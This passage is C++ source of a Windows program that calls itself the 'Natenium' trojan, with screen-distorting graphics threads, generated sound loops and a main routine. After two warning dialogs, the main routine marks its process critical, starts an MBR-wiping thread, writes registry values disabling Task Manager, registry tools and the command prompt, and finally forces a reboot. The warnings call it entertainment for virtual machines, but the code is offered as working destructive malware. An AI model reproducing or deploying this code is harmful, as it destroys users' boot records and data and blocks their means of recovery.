				int zx = (int)((cx * cos(angle) - cy * sin(angle)) / zoom);
				int zy = (int)((cx * sin(angle) + cy * cos(angle)) / zoom);

				data[y2 * x + x2] += COLORHSV((sqrt(zx * zx - zy * zy)) + (sqrt(zx * zx * zy * zy)));
			}
		}

		SetBitmapBits(bmp, 4 * x * y, data);
		StretchBlt(hdc, 0, 0, x, y, mdc, 0, 0, x, y, SRCCOPY);

		Sleep(1);

		zoom += 0.09;
		angle += 0.06;
	}

	return 0;
}
DWORD WINAPI blur1(LPVOID lpvd) //NO credits to N17Pro3426 for the PlgBlt
{
	HDC hdc;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), xSize = sw / 5, ySize = 95;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCERASE);
		for (int i = 0; i < sw + 10; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCINVERT);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCPAINT);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
		Sleep(1);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
	}
}
DWORD WINAPI shaderlast(LPVOID lpParam)
{
	while (1) {
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN),
			h = GetSystemMetrics(SM_CYSCREEN);

		HBRUSH brush = CreateSolidBrush(RGB(0, rand() % 239, rand() % 239));
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, w, h, PATCOPY);
		BitBlt(hdc, rand() % 5, rand() % 5, w, h, hdc, rand() % 5, rand() % 5, SRCCOPY);
		DeleteObject(brush);
		ReleaseDC(NULL, hdc);
	}
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 27700, 27700, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[27700 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(64 * sin((t + (1 * t >> 12 + 9 * t >> 9))) + 127);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(64 * sin((t & (8 & t >> 5 ^ 9 * t >> 10))) + 127);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(64 * sin(((t >> 2) ^ (t ^ t >> 6) * (t >> 7) + (t ^ t >> 5))) + 127);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(64 * sin((t ^ t >> (t % 2120))) + 127);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(64 * sin((3 ^ t * t >> 8)) + 127);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(64 * tan((t * (t >> 10 ^ t >> 12))) + 127);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(64 * sin((t * (t >> 3 ^ t >> 11))) + 127);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(64 * sin((t * (t >> 7 ^ t >> 4))) + 127);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(64 * tan((t * (t >> 12 ^ t >> 9))) + 127);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(64 * sin((t * ((t & 4096 ? t : 12) | (t & t >> 14)) >> (t & t >> 7))) + 127);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(64 * sin((t * (t >> 0 + t >> 10))) + 127);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
	)
{
	if (MessageBoxW(NULL, L"Warning! You have ran a (No no no no no skid) trojan known as Natenium that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator (Underwater Tiny Kong & Lets Go Windows 10) will not be responsible for any damage caused by this (No no no no no skid) trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"Natenium.exe (No no no no no skid)", MB_YESNO | MB_ICONERROR) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Final warning! This (No no no no no no no no no no no no no no no no no skid) trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator (Underwater Tiny Kong & Lets Go Windows 10) will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"Natenium.exe (No no no no no no no no no no no no no no no no no skid)", MB_YESNO | MB_ICONERROR) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			CreateThread(0, 0, noskid, 0, 0, 0);
			Sleep(8000);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			//CreateThread(0, 0, cur, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			//Sleep(100);
			HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			//Sleep(100);
			HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
			HANDLE thread4dot1 = CreateThread(0, 0, trianglez, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread6dot1 = CreateThread(0, 0, wef, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			TerminateThread(thread6dot1, 0);
			CloseHandle(thread6dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread7 = CreateThread(0, 0, shader7, 0, 0, 0);
			HANDLE thread7dot1 = CreateThread(0, 0, textout1, 0, 0, 0);
			sound7();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			InvalidateRect(0, 0, 0);
			HANDLE thread8 = CreateThread(0, 0, shader8, 0, 0, 0);
			sound8();
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			HANDLE thread9 = CreateThread(0, 0, shader9, 0, 0, 0);
			sound9();
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			HANDLE thread10 = CreateThread(0, 0, shader10, 0, 0, 0);
			sound10();
			Sleep(30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			InvalidateRect(0, 0, 0);
			HANDLE thread11 = CreateThread(0, 0, blur1, 0, 0, 0);
			sound11();
			Sleep(30000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			InvalidateRect(0, 0, 0);
			HANDLE last = CreateThread(0, 0, shaderlast, 0, 0, 0);
			Sleep(3000);
			system("shutdown.exe /r /t 00");
			ExitProcess(0);
			Sleep(-1);
		}
	}
}